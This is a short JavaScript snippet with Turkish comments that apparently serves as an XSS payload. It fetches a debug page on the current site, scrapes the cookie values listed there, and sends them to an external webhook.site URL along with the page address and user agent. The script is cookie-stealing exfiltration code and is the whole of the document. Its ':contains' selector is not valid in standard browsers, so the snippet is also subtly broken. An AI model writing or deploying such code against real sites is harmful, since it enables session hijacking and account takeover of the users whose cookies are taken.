const baseUrl = window.location.origin;
fetch(`${baseUrl}/testasda`)  
  .then(res => res.text())
  .then(html => {
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, "text/html");

    // Cookies tablosunu bul
    const table = doc.querySelector('label:contains("Cookies") + table.data-table');
    if (!table) {
      console.log("Cookies tablosu bulunamadı. Debug sayfası olmayabilir.");
      return;
    }

    const cookies = {};
    const rows = table.querySelectorAll('tbody tr');

    rows.forEach(row => {
      const key = row.children[0].textContent.trim();
      const value = row.children[1].textContent.trim();
      if (key && value) {
        cookies[key] = value;
      }
    });

    if (Object.keys(cookies).length === 0) {
      console.log("Hiç cookie bulunamadı.");
      return;
    }

    // Bulunan cookie'leri kendi webhook'una gönder
    fetch('https://webhook.site/415fe87a-5bad-42c9-9965-cd7a3e9e0693', {
      method: 'POST',
      mode: 'no-cors', // webhook.site no-cors destekler
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        url: window.location.href,
        captured_from: `${baseUrl}/testasda`,
        cookies: cookies,
        timestamp: new Date().toISOString(),
        user_agent: navigator.userAgent
      })
    });

    console.log("true", cookies);
  })
  .catch(err => console.error("Hata:", err));
